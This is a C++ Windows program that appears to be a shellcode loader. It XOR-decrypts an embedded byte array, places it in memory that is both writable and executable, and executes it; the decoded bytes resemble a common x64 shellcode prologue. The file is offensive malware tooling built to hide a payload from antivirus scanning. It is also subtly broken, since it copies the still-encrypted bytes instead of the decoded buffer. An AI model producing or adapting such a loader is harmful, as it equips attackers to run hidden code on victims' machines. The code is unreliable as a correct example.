#include <Windows.h>
#include <iostream>

#define KEYSIZE 32
#define IVSIZE 16

int main()
{
    void* exec_mem;
    unsigned char XORKey[] = {
        0x6E, 0xE7, 0x41, 0x0E, 0x8A, 0x21, 0x2A, 0xD1, 0x05, 0xA2, 0x0D, 0x34, 0xFA, 0xAB, 0x7A, 0x97 };


    unsigned char XORCipherText[] = {
            0x92, 0xAF, 0xC2, 0xEA, 0x7A, 0xC9, 0xEA, 0xD1, 0x05, 0xA2, 0x4C, 0x65, 0xBB, 0xFB, 0x28, 0xC6,
            0x38, 0xAF, 0x70, 0xDC, 0xEF, 0x69, 0xA1, 0x83, 0x65, 0xEA, 0x86, 0x66, 0xE2, 0xE3, 0xF1, 0xC5,
            0x4E, 0xAF, 0xCA, 0x7C, 0xDA, 0x69, 0x25, 0x66, 0x4F, 0xE8, 0x40, 0x05, 0x33, 0xE3, 0x4B, 0x57,
            0xC2, 0xDB, 0x20, 0x72, 0x88, 0x0D, 0x0A, 0x90, 0xC4, 0x6B, 0x00, 0x75, 0xFB, 0x6A, 0x98, 0x7A,
            0x3C, 0xA6, 0x10, 0x46, 0x01, 0x73, 0x0A, 0x5A, 0x47, 0x9E, 0x45, 0x35, 0x2A, 0x20, 0xFA, 0x1F,
            0x6E, 0xE7, 0x41, 0x46, 0x0F, 0xE1, 0x5E, 0xB6, 0x4D, 0xA3, 0xDD, 0x64, 0x71, 0xE3, 0x62, 0xD3,
            0xE5, 0xA7, 0x61, 0x47, 0x8B, 0xF1, 0xC9, 0x87, 0x4D, 0x5D, 0xC4, 0x75, 0x71, 0x9F, 0xF2, 0xDF,
            0x6F, 0x31, 0x0C, 0x3F, 0x43, 0x69, 0x1B, 0x11, 0xA9, 0xE3, 0xCC, 0xFD, 0xF7, 0xEA, 0x7B, 0x56,
            0x56, 0x07, 0x34, 0xFF, 0xC6, 0x22, 0x66, 0xF5, 0x0D, 0xE7, 0x34, 0xE5, 0x8F, 0x73, 0x22, 0xD3,
            0xE5, 0xA7, 0x65, 0x47, 0x8B, 0xF1, 0x4C, 0x90, 0x8E, 0xAE, 0x45, 0x70, 0x71, 0xEB, 0x66, 0xDE,
            0x6F, 0x37, 0x00, 0x85, 0x8E, 0xA9, 0x62, 0xD0, 0xD5, 0xE3, 0x55, 0x75, 0xA2, 0xF5, 0x23, 0xCD,
            0x2F, 0xBF, 0x00, 0x57, 0xCB, 0x7B, 0x62, 0x52, 0xE9, 0x82, 0x4C, 0x66, 0x05, 0x4B, 0x22, 0xD6,
            0x37, 0xBD, 0x09, 0x85, 0x98, 0xC8, 0x7D, 0x2E, 0xFA, 0x5D, 0x50, 0x7C, 0x40, 0xAA, 0x7A, 0x97,
            0x6E, 0xE7, 0x41, 0x0E, 0x8A, 0x69, 0xA7, 0x5C, 0x04, 0xA3, 0x0D, 0x34, 0xBB, 0x11, 0x4B, 0x1C,
            0x01, 0x60, 0xBE, 0xDB, 0x31, 0xD1, 0x9F, 0x73, 0x53, 0xE3, 0xB7, 0x92, 0x6F, 0x16, 0xE7, 0x68,
            0xBB, 0xAF, 0xC2, 0xCA, 0xA2, 0x1D, 0x2C, 0xAD, 0x0F, 0x22, 0xF6, 0xD4, 0x8F, 0xAE, 0xC1, 0xD0,
            0x7D, 0x95, 0x2E, 0x64, 0x8A, 0x78, 0x6B, 0x58, 0xDF, 0x5D, 0xD8, 0x57, 0x9B, 0xC7, 0x19, 0xB9,
            0x0B, 0x9F, 0x24, 0x0E };
    unsigned char shellcode[sizeof(XORCipherText)];
    for (int i = 0; i < sizeof(XORCipherText); i++) {

        shellcode[i] = XORCipherText[i] ^ XORKey[i % IVSIZE];
    }

    exec_mem = VirtualAlloc(0, sizeof(XORCipherText), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlMoveMemory(exec_mem, XORCipherText, sizeof(XORCipherText));

    ((void(*)())exec_mem)();

    return 0;

}